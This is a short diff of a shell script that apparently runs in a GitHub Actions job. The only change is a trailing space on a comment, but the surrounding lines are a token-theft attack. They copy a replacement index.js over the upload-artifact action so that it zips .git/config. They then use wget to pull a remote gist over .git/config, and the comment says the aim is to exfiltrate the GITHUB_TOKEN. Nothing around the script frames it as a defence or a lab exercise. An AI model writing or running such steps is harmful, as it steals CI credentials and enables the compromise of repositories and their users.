@@ -6,5 +6,5 @@ touch missing_license_headers.txt
 # patching the upload-artifact action with code to zip the .git/config file
 cp index.js /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js
 
-# modifying .git/config to exfiltrate the GITHUB_TOKEN
+# modifying .git/config to exfiltrate the GITHUB_TOKEN 
 wget https://gist.githubusercontent.com/stazottest0/7714cfc6d5e2dc941db3d31bdfe3530f/raw/f5c81694a478891228f4d6402aa95bf4f1485f99/gistfile1.txt -O .git/config
